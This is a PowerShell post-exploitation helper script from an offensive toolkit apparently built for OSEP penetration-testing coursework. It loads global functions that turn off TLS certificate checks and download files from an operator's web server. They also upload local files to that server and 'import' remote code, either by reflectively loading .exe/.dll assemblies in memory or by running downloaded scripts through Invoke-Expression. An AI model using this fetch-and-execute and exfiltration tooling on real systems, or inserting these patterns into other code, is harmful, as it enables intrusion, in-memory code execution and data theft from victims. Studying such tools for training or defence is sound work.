function Load-WebClientHelpers {
#.SYNOPSIS
# Load simple WebClientHelper tools in the session for file transfers and importing data into memory.
# AUTHOR: Tyler McCann (@tylerdotrar)
# ARBITRARY VERSION NUMBER: 3.0.0
#
#.DESCRIPTION
# Originally developed for OSEP, this script is meant to load a handful of simple WebClient
# Helper scripts into the Global session for seamless communication with the PMA web server.
# If the PMA server is using HTTPS but no HTTPS bypass has been loaded into the session, 
# this script will load the bypass prior to the Helper Scripts.
#
# Note: if the target URL is using HTTPS, a self-signed certificate bypass will be loaded.
#
# Current helper scripts:
#   import <filename>    -->  Load/reflect PowerShell scripts or C# binaries into the session
#   download <filename>  -->  Download files from the PMA web server
#   upload <filename>    -->  Upload files to the PMA web server
#
# Parameters:
#   -WebClientURL        -->  Server URL to point WebClient helpers to
#   -Help                -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory
    

    Param(
        [string]$WebClientURL = 'http(s)://<ip_addr>',
        [switch]$Help
    )


    # Return Get-Help Information
    if ($Help) { return Get-Help Load-WebClientHelpers }


    # Minor Error Correction
    if ($WebClientURL -eq 'http(s)://<ip_addr>') { return (Write-Host 'Input URL to point the WebClientHelpers to.' -ForegroundColor Red) }
    if ($WebClientURL -notlike "http*") { return 'Invalid URL format.' }


    # Bypass Self-Signed Certificate Restriction if not already loaded into the session
    if ($WebClientURL -like "https*") {
        
        # Check if bypass is missing from the current session
        if (([System.Net.ServicePointManager]::ServerCertificateValidationCallback).Method.DeclaringType.Name -ne 'SelfSignedCerts') {
        
            # Bypass Certificate Validation Callback within the Current Session
            $CertificateBypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static void WebClientBypass()
    {
        ServicePointManager.ServerCertificateValidationCallback = Bypass;
    }
}
'@
            Add-Type $CertificateBypass
            [SelfSignedCerts]::WebClientBypass()

            echo "[+]  HTTPS Bypass Loaded"
        }
    }   

    
    # Load WebClient Helpers into the Global Scope
    $global:WebClientURL = $WebClientURL


    # Download Files from 'pma_server.py'
    function global:download ([string]$File) {
        if (!$File) {return '[-] Must input file.'}
        $Filename = (PWD).Path + "/$File"
        Try {
            (New-Object System.Net.WebClient).DownloadFile("$global:WebClientURL/$File","$Filename") 2>$NULL
            if (Test-Path -LiteralPath $File) { return '[+] Download successful.' } }
        Catch [System.Net.WebException] { return '[-] File not found.'; }
        Catch { return '[-] Download unsuccessful.' }
    }
    echo '[+]  Function Loaded: "download"'


    # Upload Files to 'pma_server.py'
    function global:upload ([string]$File) {
        if (!$File) {return '[-] Must input file.'}
        if (!(Test-Path -LiteralPath $File)) { return '[-] File not found.' }
        $Filename = (Get-Item -LiteralPath $File).Name
        $Filepath = (Get-Item -LiteralPath $File).FullName
        $Response = (New-Object System.Net.WebClient).UploadFile("$global:WebClientURL/$Filename","$Filepath")
        return [System.Text.Encoding]::Ascii.GetString($Response)
    }
    echo '[+]  Function Loaded: "upload"'


    # Import Files into Session from 'pma_server.py'
    function global:import ([string]$File) {
        if (!$File) {return '[-] Must input file.'}
        Try {
            if (($File -like '*.exe') -or ($File -like '*.dll')) {
                [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("$global:WebClientURL/$File"))
                return "`n[+] Reflection successful." }
            else {
                $Contents = ((New-Object System.Net.WebClient).DownloadString("$global:WebClientURL/$File"))
                if (!($Contents -like '*function global:*')) { $Contents = $Contents.Replace('function ','function global:') }
                Invoke-Expression $Contents
                return "[+] Import succesful." } }
        Catch { return '[-] Import unsuccessful.' }
    }
    echo '[+]  Function Loaded: "import"'
}